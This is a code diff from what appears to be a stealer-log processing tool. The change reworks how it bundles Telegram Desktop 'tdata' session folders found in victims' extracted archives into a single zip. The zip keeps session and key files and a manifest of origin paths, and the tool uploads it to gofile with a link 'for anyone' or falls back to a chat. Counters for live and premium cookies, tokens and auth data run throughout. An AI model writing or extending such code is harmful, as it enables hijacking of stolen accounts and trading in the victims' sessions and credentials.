@@ -1239,49 +1239,46 @@ def find_tdata(root):
     return out + extra
 
 def pack_tdata(dirs):
-    """Each found tdata folder -> its own zip named with the folder's EXACT
-    name (tdata.zip, tdata1.zip, …duplicates get _2). All inner zips live in
-    ONE tdata.zip next to found_in.txt, which logs every origin path."""
+    """tdata.zip holds every found folder as a PLAIN folder tree — no zip inside
+    a zip. Each entry is keyed by the folder's own path inside the extracted
+    archive, so hundreds of folders all named "tdata" never collide, and
+    found_in.txt maps every path back to where it came from."""
     if not dirs:
         return None, 0
-    import io
     zp = OUT / "tdata.zip"
-    manifest, used, total = [], {""}, 0
-    base = WORK / "ex"
+    manifest, total, used = [], 0, {""}
+    roots = [WORK / "ex", WORK / "tdex", WORK / "tdfull"]
     with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as big:
         for d in dirs:
-            try:
-                rel = str(d.relative_to(base))
-            except Exception:
-                rel = d.name
-            name = re.sub(r"[^\w.-]", "_", d.name) or "tdata"
-            inner = name + ".zip"
-            k = 2
-            while inner.lower() in used:
-                inner = "%s_%d.zip" % (name, k)
-                k += 1
-            used.add(inner.lower())
-            buf = io.BytesIO()
+            rel = d.name
+            for root in roots:
+                try:
+                    rel = str(d.relative_to(root))
+                except Exception:
+                    continue
+                if root != WORK / "ex":
+                    rel = "%s/%s" % (root.name, rel)
+                break
+            rel = re.sub(r"[^\w./-]", "_", rel.strip("/")) or d.name
+            while rel.lower() in used:                     # two hunt passes, same path
+                rel = rel + "_2"
+            used.add(rel.lower())
             files = 0
-            with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as iz:
-                for f in sorted(d.rglob("*")):
-                    try:
-                        r = str(f.relative_to(d))
-                        if f.is_file():
-                            iz.write(f, r)
-                            files += 1
-                        elif f.is_dir():
-                            iz.writestr(zipfile.ZipInfo(r.rstrip("/") + "/"), "")
-                    except Exception:
-                        pass
+            for f in sorted(d.rglob("*")):
+                try:
+                    if f.is_file():
+                        big.write(str(f), "%s/%s" % (rel, f.relative_to(d)))
+                        files += 1
+                except Exception:
+                    pass
             if files:
-                big.writestr(inner, buf.getvalue())
                 total += 1
-                manifest.append("%s  <-  %s" % (inner, rel))
+                manifest.append("%s/  (%d files)" % (rel, files))
             else:
-                manifest.append("(empty) %s  <-  %s" % (inner, rel))
+                manifest.append("(empty) %s/" % rel)
         big.writestr("found_in.txt",
-                     "TDATA FOLDERS FOUND IN THE ARCHIVE\n%s\n%s\n\n" %
+                     "TDATA FOLDERS IN THIS ARCHIVE\n%s\nEvery folder below is a plain\n"
+                     "folder inside tdata.zip (unzip and use it directly):\n\n%s\n" %
                      ("=" * 48, "\n".join(manifest)))
     return zp, total
 
@@ -1349,7 +1346,7 @@ def finish(task, stage, **extra):
     payload.update({k: extra[k] for k in extra
                     if k in ("err", "found", "cookies", "tried", "sent", "failed",
                              "links", "auth", "auth_sent", "auth_fid", "td_total",
-                             "td_parts", "tok_total", "tok_parts",
+                             "td_parts", "td_via", "tok_total", "tok_parts",
                              "ck_total", "ck_live", "ck_prem", "ck_free",
                              "ck_exp", "ck_dead", "ck_err", "ck_zip", "ck_proxies")})
     payload["pubs"] = PB[3]
@@ -1418,18 +1415,32 @@ def process(task):
         if not tdirs:
             tdirs = find_tdata(WORK / "ex")   # final sweep, signature rules too
         td_zip, td_total = pack_tdata(tdirs)
-    td_parts, td_link = 0, None
+    td_parts, td_link, td_via = 0, None, None
     if td_zip:
-        def td_cap(size, idx, count, tot, split):
-            return (f"{gold_header('TDATA FOUND', esc('%d folder%s found'
-                       % (td_total, '' if td_total == 1 else 's')))}\n{THIN}\n"
-                    f"🗃 {bold('Folders')}  {code(td_total)}\n"
-                    + ship_note(idx, count, size, tot, split, "tdata.zip") +
-                    f"🗂 {bold('Layout')}  every inner zip keeps the folder's exact "
-                    f"name (tdata.zip, tdata1.zip…)\n"
-                    f"🗝 {bold('Manifest')}  found_in.txt shows each origin path\n"
-                    f"📎 Sessions, map0/map1 and key files all included.")
-        td_parts, td_link = ship(td_zip, td_cap)
+        td_size = td_zip.stat().st_size
+        td_head = (f"{gold_header('TDATA FOUND', esc('%d folder%s found'
+                    % (td_total, '' if td_total == 1 else 's')))}\n{THIN}\n"
+                   f"🗃 {bold('Folders')}  {code(td_total)}\n"
+                   f"📦 {bold('Size')}     {code(fs(td_size))}\n")
+        td_tail = (f"🗂 {bold('Layout')}    plain folder trees inside the zip — "
+                   f"no zip-in-zip, unzip and use\n"
+                   f"🗝 {bold('Manifest')}  found_in.txt shows each origin path\n"
+                   f"📎 Sessions, map0/map1 and key files all included.")
+        td_link = gofile(str(td_zip))
+        if td_link:
+            td_parts, td_via = 1, "link"
+            new_card(td_head + f"🔓 {bold('Download')} {code(td_link)}\n"
+                              f"🌐 {bold('Note')}      one zip, whole tdata set — "
+                              f"link works for anyone, not just you\n" + td_tail)
+        else:
+            # gofile is down — the archive is still worth delivering, so fall back
+            # to the chat copy instead of losing the run's tdata work.
+            sys.stdout.write("gofile failed for tdata.zip — sending it to chat\n")
+            sys.stdout.flush()
+            def td_cap(size, idx, count, tot, split):
+                return td_head + ship_note(idx, count, size, tot, split, "tdata.zip") + td_tail
+            td_parts, td_link = ship(td_zip, td_cap)
+            td_via = "chat"
         if td_link:
             links["tdata"] = td_link
     tok_zip, tok_total = None, 0
@@ -1453,7 +1464,7 @@ def process(task):
     finish(task, "done", found=packed, cookies=sum(packed.values()), sent=sent,
            failed=failed, links=links, auth=len(auths) if want_auth else 0,
            auth_sent=auth_sent, auth_fid=auth_fid if want_auth else None,
-           td_total=td_total, td_parts=td_parts,
+           td_total=td_total, td_parts=td_parts, td_via=td_via,
            tok_total=tok_total, tok_parts=tok_parts, **ck)
 
 def main():
